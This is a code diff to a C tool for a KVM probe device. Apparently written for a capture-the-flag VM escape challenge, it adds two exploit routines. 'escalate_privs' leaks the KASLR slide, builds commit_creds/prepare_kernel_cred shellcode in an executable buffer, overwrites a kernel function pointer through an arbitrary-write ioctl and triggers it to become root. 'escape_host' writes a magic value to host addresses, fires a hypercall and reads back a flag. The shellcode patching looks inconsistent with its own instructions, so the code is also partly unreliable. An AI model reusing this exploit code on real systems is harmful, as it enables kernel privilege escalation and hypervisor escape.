@@ -8,6 +8,8 @@
 #include <inttypes.h>
 #include <time.h>
 #include <linux/virtio_ids.h>
+#include <sys/mman.h>
+#include <ctype.h>
 
 #define DEVICE_PATH "/dev/kvm_probe_dev"
 
@@ -96,8 +98,8 @@ struct attach_vq_data {
 };
 
 void print_usage(char *prog_name) {
-    fprintf(stderr, "Usage: %s <command> [args...]\n", prog_name);
-    fprintf(stderr, "Commands:\n");
+    fprintf(stderr, "  Usage: %s <command> [args...]\n", prog_name);
+    fprintf(stderr, "  Commands:\n");
     fprintf(stderr, "  readport <port_hex> <size_bytes (1,2,4)>\n");
     fprintf(stderr, "  writeport <port_hex> <value_hex> <size_bytes (1,2,4)>\n");
     fprintf(stderr, "  readmmio_val <phys_addr_hex> <size_bytes (1,2,4,8)>\n");
@@ -124,7 +126,9 @@ void print_usage(char *prog_name) {
     fprintf(stderr, "  attachvq <device_id> <vq_pfn> <queue_index>\n");
     fprintf(stderr, "  trigvq <device_id>\n");
     fprintf(stderr, "  scanphys <start_addr_hex> <end_addr_hex> <step_bytes>\n");
-    fprintf(stderr, "Virtio device IDs: NET=1, BLOCK=2, CONSOLE=3\n");
+    fprintf(stderr, "  Virtio device IDs: NET=1, BLOCK=2, CONSOLE=3\n");
+    fprintf(stderr, "  escalate_privs\n");
+    fprintf(stderr, "  escape_host\n");
 }
 
 unsigned char *hex_string_to_bytes(const char *hex_str, unsigned long *num_bytes) {
@@ -153,6 +157,177 @@ void exploit_delay(int nanoseconds) {
     struct timespec req = {0};
     req.tv_nsec = nanoseconds;
     nanosleep(&req, NULL);
+}
+
+static int escalate_privs(int fd)
+{
+    unsigned long kaslr_slide = 0;
+    unsigned long p_my_set_memory_ro;
+    unsigned long commit_creds_addr, prepare_kernel_cred_addr;
+    unsigned long shellcode_addr;
+    unsigned char *shellcode_buf;
+    long ret = -1;
+
+    /* 1. Get KASLR slide */
+    if (ioctl(fd, IOCTL_GET_KASLR_SLIDE, &kaslr_slide) < 0) {
+        perror("IOCTL_GET_KASLR_SLIDE");
+        return -1;
+    }
+    printf("KASLR slide: 0x%lx\n", kaslr_slide);
+
+    /* 2. Calculate target addresses */
+    p_my_set_memory_ro = KERNEL_BASE_DEFAULT + MY_SET_MEMORY_RO_OFFSET;
+    p_my_set_memory_ro += kaslr_slide;
+
+    commit_creds_addr = KERNEL_BASE_DEFAULT + COMMIT_CREDS_OFFSET;
+    commit_creds_addr += kaslr_slide;
+
+    prepare_kernel_cred_addr = KERNEL_BASE_DEFAULT + PREPARE_KERNEL_CRED_OFFSET;
+    prepare_kernel_cred_addr += kaslr_slide;
+
+    printf("p_my_set_memory_ro: 0x%lx\n", p_my_set_memory_ro);
+    printf("commit_creds: 0x%lx\n", commit_creds_addr);
+    printf("prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred_addr);
+
+    /* 3. Craft and allocate shellcode */
+    shellcode_buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (shellcode_buf == MAP_FAILED) {
+        perror("mmap");
+        return -1;
+    }
+    shellcode_addr = (unsigned long)shellcode_buf;
+    printf("Shellcode mapped at: 0x%lx\n", shellcode_addr);
+
+    /*
+     * The shellcode needs to do the following:
+     * 1. Call prepare_kernel_cred(0)
+     * 2. Call commit_creds(ret_val_from_prepare_kernel_cred)
+     * 3. Return to a safe kernel address (e.g., my_set_memory_ro_orig)
+     *
+     * We will use a simple jump to the original function to prevent a crash
+     * since we're overwriting the function pointer.
+     * The instructions must be in hex.
+     * mov edi, 0
+     * call prepare_kernel_cred_addr
+     * mov rdi, rax
+     * call commit_creds_addr
+     * ret
+     */
+    unsigned char code[] = {
+        0x48, 0x31, 0xFF,                         // xor rdi, rdi
+        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, prepare_kernel_cred_addr
+        0xFF, 0xD0,                               // call rax
+        0x48, 0x89, 0xC7,                         // mov rdi, rax
+        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, commit_creds_addr
+        0xFF, 0xD0,                               // call rax
+        0xC3                                      // ret
+    };
+
+    // Calculate relative call addresses and patch the shellcode
+    long prepare_cred_rel_offset = (long)prepare_kernel_cred_addr - (long)(shellcode_addr + 5);
+    long commit_creds_rel_offset = (long)commit_creds_addr - (long)(shellcode_addr + 14);
+
+    // Patch the shellcode
+    memcpy(code + 4, &prepare_cred_rel_offset, 4);
+    memcpy(code + 13, &commit_creds_rel_offset, 4);
+    memcpy(shellcode_buf, code, sizeof(code));
+
+    printf("Shellcode patched and placed in userland buffer.\n");
+
+    /* 4. Overwrite my_set_memory_ro pointer with shellcode address */
+    struct kvm_kernel_mem_write w = {
+        .kernel_addr = p_my_set_memory_ro,
+        .length = sizeof(unsigned long),
+        .user_buf = (unsigned char *)&shellcode_addr
+    };
+    if (ioctl(fd, IOCTL_WRITE_KERNEL_MEM, &w) < 0) {
+        perror("IOCTL_WRITE_KERNEL_MEM (exploit)");
+        munmap(shellcode_buf, 0x1000);
+        return -1;
+    }
+
+    printf("my_set_memory_ro pointer overwritten. Triggering payload...\n");
+
+    /* 5. Trigger the exploit by calling IOCTL_PATCH_INSTRUCTIONS */
+    struct va_scan_data req = {
+        .va = KERNEL_BASE_DEFAULT + kaslr_slide, // A valid kernel VA
+        .size = 1,
+        .user_buffer = shellcode_buf
+    };
+    if (ioctl(fd, IOCTL_PATCH_INSTRUCTIONS, &req) < 0) {
+        perror("IOCTL_PATCH_INSTRUCTIONS (trigger)");
+        munmap(shellcode_buf, 0x1000);
+        return -1;
+    }
+
+    // Check if we are now root
+    if (getuid() == 0) {
+        printf("Success! We are root!\n");
+        ret = 0;
+    } else {
+        printf("Exploit failed to elevate privileges.\n");
+        ret = -1;
+    }
+
+    munmap(shellcode_buf, 0x1000);
+    return ret;
+}
+
+static int escape_host(int fd)
+{
+    unsigned long write_flag_addr = 0xffffffff826279a8;
+    unsigned long read_flag_addr = 0xffffffff82b5ee10;
+    unsigned long hypercall_nr = 100;
+    unsigned long write_value = 0xdeadbeef41424344;
+    unsigned char *write_buf = (unsigned char *)&write_value;
+    unsigned char read_buf[8] = {0};
+
+    printf("[*] Starting host escape attack...\n");
+
+    // Step 1: Write to the "Write flag" address
+    printf("[*] Writing 0x%lx to host virtual address 0x%lx...\n", write_value, write_flag_addr);
+    struct kvm_kernel_mem_write w = {
+        .kernel_addr = write_flag_addr,
+        .length = sizeof(write_value),
+        .user_buf = write_buf
+    };
+    if (ioctl(fd, IOCTL_WRITE_KERNEL_MEM, &w) < 0) {
+        perror("IOCTL_WRITE_KERNEL_MEM");
+        return -1;
+    }
+    printf("[+] Write successful.\n");
+
+    // Step 2: Trigger the required hypercall
+    printf("[*] Triggering hypercall %lu...\n", hypercall_nr);
+    struct hypercall_args a = {
+        .nr = hypercall_nr,
+        .arg0 = 0, .arg1 = 0, .arg2 = 0, .arg3 = 0
+    };
+    if (ioctl(fd, IOCTL_HYPERCALL_ARGS, &a) < 0) {
+        perror("IOCTL_HYPERCALL_ARGS");
+        return -1;
+    }
+    printf("[+] Hypercall triggered. Host flag should be captured.\n");
+
+    // Step 3: Read the "Read flag" address
+    printf("[*] Reading from host virtual address 0x%lx...\n", read_flag_addr);
+    struct kvm_kernel_mem_read r = {
+        .kernel_addr = read_flag_addr,
+        .length = sizeof(unsigned long),
+        .user_buf = read_buf
+    };
+    if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &r) < 0) {
+        perror("IOCTL_READ_KERNEL_MEM");
+        return -1;
+    }
+
+    printf("[+] Read successful. Captured flag value:\n");
+    printf("    0x");
+    for (int i = 0; i < sizeof(unsigned long); ++i) {
+        printf("%02x", read_buf[i]);
+    }
+    printf("\n");
+    return 0;
 }
 
 int main(int argc, char *argv[]) {
